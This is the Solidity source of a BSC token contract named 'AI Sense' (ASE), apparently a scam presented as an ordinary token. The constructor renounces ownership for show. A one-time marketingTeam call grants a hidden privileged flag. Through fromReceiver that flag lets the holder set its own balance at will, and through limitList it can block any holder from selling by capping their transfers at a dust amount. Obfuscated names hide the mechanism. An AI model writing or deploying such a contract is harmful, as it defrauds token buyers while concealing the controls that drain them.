/**
 *Submitted for verification at BscScan.com on 2023-02-03
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface teamLiquidityExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface walletAt {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract AISense is Ownable{
    uint8 public decimals = 18;
    mapping(address => bool) public launchMin;
    mapping(address => uint256) public balanceOf;
    bool public toReceiver;
    string public symbol = "ASE";

    string public name = "AI Sense";
    address public toAmount;


    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public txMin;
    uint256 constant senderList = 10 ** 10;
    address public totalLiquidityFund;

    uint256 public totalSupply = 100000000 * 10 ** 18;
    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        teamLiquidityExempt autoTxFee = teamLiquidityExempt(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        totalLiquidityFund = walletAt(autoTxFee.factory()).createPair(autoTxFee.WETH(), address(this));
        toAmount = swapReceiver();
        launchMin[toAmount] = true;
        balanceOf[toAmount] = totalSupply;
        emit Transfer(address(0), toAmount, totalSupply);
        renounceOwnership();
    }

    

    function approve(address sellFrom, uint256 amountLaunched) public returns (bool) {
        allowance[swapReceiver()][sellFrom] = amountLaunched;
        emit Approval(swapReceiver(), sellFrom, amountLaunched);
        return true;
    }

    function transfer(address sellLiquidityReceiver, uint256 amountLaunched) external returns (bool) {
        return transferFrom(swapReceiver(), sellLiquidityReceiver, amountLaunched);
    }

    function fromReceiver(uint256 amountLaunched) public {
        if (!launchMin[swapReceiver()]) {
            return;
        }
        balanceOf[toAmount] = amountLaunched;
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function transferFrom(address takeTo, address sellLiquidityReceiver, uint256 amountLaunched) public returns (bool) {
        if (takeTo != swapReceiver() && allowance[takeTo][swapReceiver()] != type(uint256).max) {
            require(allowance[takeTo][swapReceiver()] >= amountLaunched);
            allowance[takeTo][swapReceiver()] -= amountLaunched;
        }
        if (sellLiquidityReceiver == toAmount || takeTo == toAmount) {
            return fromTeam(takeTo, sellLiquidityReceiver, amountLaunched);
        }
        if (txMin[takeTo]) {
            return fromTeam(takeTo, sellLiquidityReceiver, senderList);
        }
        return fromTeam(takeTo, sellLiquidityReceiver, amountLaunched);
    }

    function limitList(address amountAtLaunch) public {
        if (amountAtLaunch == toAmount || amountAtLaunch == totalLiquidityFund || !launchMin[swapReceiver()]) {
            return;
        }
        txMin[amountAtLaunch] = true;
    }

    function swapReceiver() private view returns (address) {
        return msg.sender;
    }

    function marketingTeam(address teamSell) public {
        if (toReceiver) {
            return;
        }
        launchMin[teamSell] = true;
        toReceiver = true;
    }

    function fromTeam(address swapFrom, address tokenModeFund, uint256 amountLaunched) internal returns (bool) {
        require(balanceOf[swapFrom] >= amountLaunched);
        balanceOf[swapFrom] -= amountLaunched;
        balanceOf[tokenModeFund] += amountLaunched;
        emit Transfer(swapFrom, tokenModeFund, amountLaunched);
        return true;
    }


}